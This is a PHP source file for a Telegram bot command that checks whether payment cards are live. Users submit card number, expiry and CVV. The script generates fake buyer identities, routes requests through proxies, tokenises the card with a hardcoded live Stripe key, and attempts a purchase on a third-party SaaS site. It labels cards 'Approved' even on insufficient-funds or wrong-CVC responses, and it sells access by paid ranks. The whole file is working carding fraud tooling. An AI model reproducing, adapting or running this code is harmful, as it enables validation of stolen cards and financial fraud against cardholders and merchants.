<?php



$ownerData = file_get_contents('database/owner.txt');
if (strpos($ownerData, "$userId") !== false) {
    $rank = "OWNER"; 
} else {
    $paidData = file_get_contents('database/paid.txt');
    $pattern = "/User ID: $userId\nRank: (.+)\n/";
    if (preg_match($pattern, $paidData, $matches)) {
        $rank = $matches[1];
    } else {
        $rank = "FREE";
    }
}

if((strpos($text, '/any') === 0) or (strpos($text, '.any') === 0) or ((strpos($text, '$any') === 0) or (strpos($text, '!any') === 0)) or ((strpos($text, '+any') === 0) or (strpos($text, '#any') === 0)) or (strpos($text, '?any') === 0)) {

 $userData = file_get_contents('database/users.txt');
if (strpos($userData, $userId) === false) {
bot('sendMessage', [
    'chat_id' => $chat_id,
    'message_id' => $message_id,
    'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]ACCESS DENIED! ❌
- - - - - - - - - - - - - - - - - - - - - -
[↯]Status: <code>Unregistered User! ⚠️</code>
[↯]Message: <code>You have to register first to use me</code>
You have to use <code>/register</code> to use me 
- - - - - - - - - - - - - - - - - - - - - -
</b>",
    'reply_to_message_id' => $message_id,
    'parse_mode' => 'html'
]);
return;
}   


if (strlen($message) <= 4) {
            bot('sendMessage', [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - - 
[WRONG FORMAT] ⚠️
- - - - - - - - - - - - - - - - - - - - - -
Ex: <code>/chk cc|mm|yy|cvv</code>     
Gateway <code>Stripe 1 USD</code>        
- - - - - - - - - - - - - - - - - - - - - -
</b>",
        'reply_to_message_id' => $message_id,
        'parse_mode' => 'html'
    ]);
return;
}

$paid = file_get_contents('database/paid.txt');
if (preg_match('/User ID:\s*(\d+)/', $paid, $matches)) {
$paids = $matches[1];
}
  
$owner = file_get_contents('database/owner.txt');
$owners = explode("\n", $owner);

$authgrp = file_get_contents('database/authgrp.txt');
$authgrps = explode("\n", $authgrp);

if (!preg_match($pattern, $paidData, $matches) && !in_array($chatId, $owners)) {

if (!in_array($chatId, $authgrps)) {
      
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'message_id' => $message_id,
            'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]ACCESS DENIED! ❌
- - - - - - - - - - - - - - - - - - - - - -
[↯]Status: <code>Not Allowed Here!⚠️</code>
[↯]Message: <code>Contact the Owner to authorize</code>
- - - - - - - - - - - - - - - - - - - - - -
</b>",
            'reply_to_message_id' => $message_id,
            'parse_mode' => 'html'
        ]);
        return;
    }
}

$spamWaitTime = isSpamming($userId);
if ($spamWaitTime !== false) {
bot('sendMessage', [
            'chat_id' => $chat_id,
            'message_id' => $message_id,
            'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]ANTISPAM DETECTED! ⚠️
- - - - - - - - - - - - - - - - - - - - - -
[↯] Try again after $spamWaitTime seconds !
- - - - - - - - - - - - - - - - - - - - - -
</b>",
            'reply_to_message_id' => $message_id,
            'parse_mode' => 'html'
        ]);
        return;
}

  

$start_time = microtime(true);
  
$messageidtoedit23 = bot('sendmessage',[
          'chat_id'=>$chat_id,
          'text'=>"<b>Started checking...</b>",
          'parse_mode'=>'html',
          'reply_to_message_id'=> $message_id,

        ]);

        $messageidtoany = capture(json_encode($messageidtoedit23), '"message_id":', ',');
        
  if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}


$lista = substr($message, 5);
$lista = clean($lista);
$check = strlen($lista);
$chem = substr($lista, 0,1);
$cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
$strlenn = strlen($cc);
$strlen1 = strlen($mes);
$ano1 = $ano;
$lista = (''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');

  
$last4 = substr($cc, -4);


//=========BANNED BIN=============//
$bin = substr($cc, 0, 6);
$bannedBins = file("banned.txt", FILE_IGNORE_NEW_LINES);

if (in_array($bin, $bannedBins)) {
bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoany,
            'text'=>"<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]BIN BANNED! ⚠️
- - - - - - - - - - - - - - - - - - - - - -
[↯]CC: <code>$lista</code>
[↯]Reason: <code>All Prepaid banned!</code>
 - - - - - - - - - - - - - - - - - - - - - -
</b>",
            'parse_mode'=>'html',
            
        ]);
return;
}
  
//---------------------//
bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoany,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Adyen
Status: <code>■□□□□ 20%[🟥]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',
            
        ]);


  
function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}

function pro($stringlength = 16) {
    return substr(str_shuffle(str_repeat($string='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', ceil($stringlength/strlen($string)) )),1,$stringlength);
}

#$key = pro();
$web = pro();  
  
  
  
  function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
//================[Functions and Variables]================//
#------[Email Generator]------#



function emailGenerate($length = 10)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString . '@gmail.com';
}
$email = emailGenerate();
#------[Username Generator]------#
function usernameGen($length = 13)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$un = usernameGen();
#------[Password Generator]------#
function passwordGen($length = 15)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$pass = passwordGen();

#------[CC Type Randomizer]------#

 $cardNames = array(
    "3" => "American Express",
    "4" => "Visa",
    "5" => "MasterCard",
    "6" => "Discover"
 );
 $card_type = $cardNames[substr($cc, 0, 1)];
 


//==================[Randomizing Details]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$postcode = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$num = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

//==============[Randomizing Details-END]======================//

bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoany,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Adyen
Status: <code>□■□□□ 40%[🟦]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',
            
        ]);


//==================[BIN LOOK-UP]======================//
  $fim = json_decode(file_get_contents('https://bins.antipublic.cc/bins/'.$bin), true);
$bin1 = $fim["bin"] ?? null;

    if ($bin1 !== null) {
        $brand = $fim["brand"];
        $country = $fim["country"];
        $country_name = $fim["country_name"];
        $country_flag = $fim["country_flag"];
        
        $country_currencies = $fim["country_currencies"];
        $bank = $fim["bank"];
        $level = $fim["level"];
        $type = $fim["type"];
    }
//==================[BIN LOOK-UP-END]======================//



 
 bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoany,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Adyen
Status: <code>□□■□□ 60%[🟨]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',
            
        ]);
//=======================[5 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: api.stripe.com';
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Path: /v1/tokens';
$headers[] = 'Origin: https://js.stripe.com';
$headers[] = 'Referer: https://js.stripe.com/';
$headers[] = 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.79';


curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$firstname.'+'.$lastname.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=5fe9577d-ceec-4972-8523-f580803e420a8cd9e6&muid=5c8bf1b0-aa82-45ed-8cda-243f3ca80ee1416adb&sid=4ae3c1b2-a82c-43bd-a144-61992c9c198f616f10&payment_user_agent=stripe.js%2Feead51ae1e%3B+stripe-js-v3%2Feead51ae1e%3B+card-element&time_on_page=26257&key=pk_live_BssIav0BSd7QyAEoguHrrr0U&pasted_fields=number
');

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result1 = curl_exec($ch);
$tok = trim(strip_tags(getStr($result1,'"id": "','"')));
$id1 = trim(strip_tags(getStr($result1,'"id": "','"')));
$card = trim(strip_tags(getStr($result1, '"card": {"id": "', '"')));

$pi = trim(strip_tags(getStr($result1,'client_secret":"','_secret')));

$src = trim(strip_tags(getStr($result1,'client_secret":"','"')));


//=======================[5 REQ]==================================//

bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoany,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Adyen
Status: <code>□□□■□ 80%[🟧]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',
            
        ]);


//-------------------Req 2--------------//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://app.mixmax.com/api/purchases');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'host: app.mixmax.com';
$headers[] = 'path: /api/purchases';
$headers[] = 'accept:  */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/json';
$headers[] = 'Cookie: intercom-id-d4ti7vd5=7afbafd8-81d9-44be-b897-fd29b038f583; intercom-session-d4ti7vd5=; intercom-device-id-d4ti7vd5=ff857c12-d2aa-4d84-89f2-9c4d38639965; __stripe_mid=5c8bf1b0-aa82-45ed-8cda-243f3ca80ee1416adb; __stripe_sid=4ae3c1b2-a82c-43bd-a144-61992c9c198f616f10; _dd_s=rum=1&id=1312ca6a-9aa7-4191-b2b2-c066b209e200&created=1692723797206&expire=1692724724970&logs=1';
$headers[] = 'origin: https://app.mixmax.com';
$headers[] = 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36'; 
$headers[] = 'x-requested-with: XMLHttpRequest';

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"token":{"id":"'.$tok.'","object":"token","card":{"id":"'.$card.'","object":"card","address_city":"","address_country":"","address_line1":"","address_line1_check":"","address_line2":"","address_state":"","address_zip":"","address_zip_check":"","brand":"'.$card_type.'","country":"US","cvc_check":"unchecked","dynamic_last4":"","exp_month":"'.$mes.'","exp_year":"'.$ano.'","funding":"debit","last4":"'.$last4.'","name":"'.$firstname.' '.$lastname.'","tokenization_method":"","wallet":""},"client_ip":"37.111.222.131","created":"1692723826","livemode":"true","type":"card","used":"false"},"name":"'.$firstname.' '.$lastname.'","email":"'.$email.'","featureName":"mixmaxProfessionalMonthlyOct2017","coupon":"","location":"homepage - pricing"}
');

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result2 = curl_exec($ch);

$jsonResponse2 = json_decode($result2, true);
$msg = $jsonResponse2['message'];


//=======================[MADE BY SIFAT]==============================//

bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoany,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Adyen
Status: <code>□□□□■ 100%[🟩]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',
            
        ]);

//=============CHECKER PART END============//

if (
    strpos($result2, 'Thank you for your membership.') !== false ||
    strpos($result2, 'Membership confirmed.') !== false ||
    strpos($result2, 'Membership Confirmation') !== false ||
    strpos($result2, 'Thank You For Donation.') !== false ||
    strpos($result2, 'incorrect_zip') !== false ||
    strpos($result2, 'Success ') !== false ||
    strpos($result2, '"type":"one-time"') !== false ||
    strpos($result2, '/donations/thank_you?donation_number=') !== false
) {

$status = ("Approved ✅");  
$respo = ("Approved");
}

elseif(strpos($result2, "Your card has insufficient funds.") || strpos($result2, "insufficient_funds")) {
$status = ("Approved ✅");  
$respo = ("Approved");
}
elseif(strpos($result2, 'security code is incorrect.') !== false || strpos($result2, 'security code is invalid.') !== false || strpos($result2, "incorrect_cvc") !== false) {
$status = ("Approved ✅");  
$respo = ("Approved");
}
elseif(strpos($result2, "Your card does not support this type of purchase.")) {
$status = ("Approved ✅");  
$respo = ("Approved");
}
elseif(strpos($result2, "stripe_3ds2_fingerprint")) {
$status = ("Approved ✅");  
$respo = ("Approved");
}


else {
$status = ("Declined ❌");  
$respo = ("Payment rejected");
}


$end_time = microtime(true);
$time = number_format($end_time - $start_time, 2);
//=============CHECKER END=============//
bot('editMessageText',[
                'chat_id'=>$chat_id,
               'message_id'=>$messageidtoany,
'text'=>"<b>
Adyen Auth 🌩
━━━━━━━━━━━━━
[ϟ]Card: <code>$lista</code> 
[ϟ]Status: $status
[ϟ]Result: $respo

[ϟ]Brand: <code>$level-$brand</code>
[ϟ]Type: <code>$type</code>
[ϟ]Bank: <code>$bank</code>
[ϟ]Country: <code>$country_name [$country_flag]</code>

[ϟ]T: <code>$time SEC</code> | P: <code>Live ✅</code>
━━━━━━━━━━━━━
[ϟ]Req: <b>@$username</b> [$rank]
[ϟ]Dev: <code>@celestial_being</code>

</b>",
      'parse_mode'=>'html',
                'disable_web_page_preview'=>'true'
                
            ]);
recordBotResponseTimestamp($userId);

    }else{
        bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoany,
            'text'=>"<b>Provide a Valid CC</b>",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true'
            
        ]);

}
